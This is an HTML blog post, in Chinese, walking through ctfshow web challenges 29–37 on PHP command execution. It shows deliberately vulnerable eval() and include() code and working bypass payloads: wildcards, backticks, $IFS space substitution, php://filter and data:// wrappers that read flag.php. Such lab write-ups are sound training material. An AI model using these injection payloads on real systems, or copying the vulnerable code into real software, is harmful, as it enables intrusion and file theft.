@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <link href="https://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="generator" content="Hugo 0.78.2" />
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Ctfshow_webrm29_124 &middot; LHY&#39;bolgs</title>
+  <meta name="description" content="" />
+
+  
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/print.css" media="print">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/poole.css">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/syntax.css">
+  <link type="text/css" rel="stylesheet" href="https://hzlhy.github.io/css/hyde.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">
+
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  
+</head>
+
+  <body class="theme-base-08 ">
+  <aside class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <a href="https://hzlhy.github.io/"><h1>LHY&#39;bolgs</h1></a>
+      <p class="lead">
+       小白的初尝试 
+      </p>
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li><a href="https://hzlhy.github.io/">Home</a> </li>
+        <li><a href="/about/"> About me </a></li><li><a href="https://hzlhy.github.io/categories/"> Categories </a></li><li><a href="https://hzlhy.github.io/tags/"> Tags </a></li>
+      </ul>
+    </nav>
+
+    <p>&copy; 2021. All rights reserved. </p>
+  </div>
+</aside>
+
+    <main class="content container">
+    <div class="post">
+  <h1>Ctfshow_webrm29_124</h1>
+  <time datetime=2021-02-25T22:44:08&#43;0800 class="post-date">Thu, Feb 25, 2021</time>
+  <h2 id="ctfshow-web-入门命令执行">ctfshow web 入门命令执行</h2>
+<h3 id="web29">web29</h3>
+<pre><code>&lt;?php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p><strong>知识点：通配符；</strong>
+看到有eval()执行函数
+过滤了flag ，可以使用通配符进行绕过。所以payload为：<code>c=system('cat f*');</code>返回的flag进行了隐藏，右键查看源码即可。
+也可以通过文件包含来解决，payload：
+先传入<code>?c=echo &quot;lhy&quot;;?&gt;ctfshow &lt;?php system('ls');</code>看到有flag.php文件（前面需要echo &ldquo;lhy&rdquo;;?&gt;是因为传入c的时候表示一段代码的开始，?&gt;结束后开始执行后面的代码），接下来的为<code>?c=echo &quot;lhy&quot;; ?&gt;ctfshow &lt;?php include($_GET['url']);&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code>
+补充：对于linux cat 和ca'&rsquo;t ca\t ca&quot;&ldquo;t效果是相同的，这样可以绕过字符的限制，如<code>c=system('ca\t fla\g.php');</code></p>
+<h3 id="web30">web30</h3>
+<pre><code>&lt;?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p><strong>知识点：反引号执行系统命令；</strong>
+与29相比增加了对命令函数的过滤，命令执行函数有很多，如
+<code>system()</code>
+<code>passthru()</code>
+<code>exec()</code>
+<code>shell_exec()</code>
+<code>popen()</code>
+<code>proc_open()</code>
+<code>pcntl_exec()</code>
+<code>反引号</code>
+只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过
+payload1:<code>c=echo `cat f*`;</code>
+payload2:<code>?c=passthru(&quot;cat f*&quot;);</code>
+还可以采用文件包含：
+payload3:<code>?c=echo &quot;lhy &quot;; include($_GET['url']); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h3 id="web31">web31</h3>
+<pre><code>&lt;?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p><strong>知识点：空格过滤+cat过滤绕过</strong>
+这里过滤掉了空格和单引号等等
+<strong>在linux空格可以用一下字符代替</strong>：
+<code>%09(tab)、$IFS$9、 ${IFS}、$IFS%09(tab)、&lt; 、&lt;&gt;、%20(space)等</code>
+<strong>cat被过滤：</strong>
+<code>more:一页一页的显示档案内容</code>
+<code>less:与 more 类似</code>
+<code>head:查看头几行</code>
+<code>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</code>
+<code>tail:查看尾几行</code>
+<code>nl：显示的时候，顺便输出行号</code>
+<code>od:以二进制的方式读取档案内容</code>
+<code>vi:一种编辑器，这个也可以查看</code>
+<code>vim:一种编辑器，这个也可以查看</code>
+<code>sort:可以查看</code>
+<code>uniq:可以查看</code>
+<code>file -f:报错出具体内容</code></p>
+<p>payload1:<code>c=echo(tac%09f*);</code>
+payload2:<code>c=echo(`more%09f*`);</code>
+payload3:<code>?c=passthru(&quot;more%09f*&quot;);</code>
+payload4:<code>c=include($_GET[&quot;url&quot;]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code>
+直接单引号改为双引号即可</p>
+<h3 id="web32">web32</h3>
+<p>知识点：过滤括号绕过</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+</code></pre><p>payload1:<code>?c=include $_GET[&quot;npfs&quot;] ?&gt;&amp;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code>
+payload2:<code>?c=include $_POST[npfs] ?&gt;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h3 id="web33">web33</h3>
+<p><strong>知识点：单双引号过滤绕过</strong></p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\&quot;/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p>过滤了单双引号，直接用数组作为参数即可绕过
+payload1:<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code>
+payload2:<code>?c=include $_POST[a]?&gt;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h3 id="web34">web34</h3>
+<pre><code>&lt;?php
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p>payload同上</p>
+<h3 id="web35">web35</h3>
+<pre><code> if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c)){
+        eval($c);
+    }
+</code></pre><p>payload同上</p>
+<h3 id="web36">web36</h3>
+<pre><code>if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c)){
+        eval($c);
+    }
+</code></pre><p>过滤了数字，同上，只需把数字改为字符就行</p>
+<h3 id="web37">web37</h3>
+<pre><code>&lt;?php
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match(&quot;/flag/i&quot;, $c)){
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre><p>这里用了PHP文件包含函数include(),可以利用为协议来读flag
+data://，类似php://input，可以让用户来控制输入流，与包含函数结合时，用户输入的data://流会被当做php文件来执行。
+payload:<code>?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</code></p>
+
+</div>
+
+
+    </main>
+
+    
+      
+    
+  </body>
+</html>
